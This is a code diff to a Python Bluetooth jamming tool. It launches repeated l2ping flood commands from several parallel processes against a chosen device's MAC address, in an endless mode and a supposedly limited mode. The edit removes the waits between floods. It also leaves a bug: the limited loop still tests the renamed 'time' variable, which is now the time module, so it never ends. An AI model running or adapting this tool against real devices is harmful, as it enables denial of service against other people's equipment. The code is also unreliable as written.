@@ -2,13 +2,14 @@ import subprocess
 import colorama
 from colorama import Fore, Back, Style
 import headers
+import time
 
 colorama.init(autoreset=True)
 headers.header()
 
 BTService = ("systemctl start bluetooth.service")
 subprocess.Popen(BTService, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-time = 999
+timing = 999
 
 def endless_jamming():
     a = True
@@ -21,13 +22,11 @@ def endless_jamming():
         process_1 = subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
         process_2 = subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
         process_3 = subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-        process_1.wait()
-        process_2.wait()
-        process_3.wait()
+        time.sleep(0.1)
 
 
 def limited_jamming():
-    global time
+    global timing
     try:
         while time != 0:
             xterm_1 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
@@ -36,7 +35,7 @@ def limited_jamming():
             subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
             subprocess.Popen(xterm_2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
             subprocess.Popen(xterm_3, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-            time -= 1
+            timing -= 1
     except Exception as error:
         print("See ya later")
 
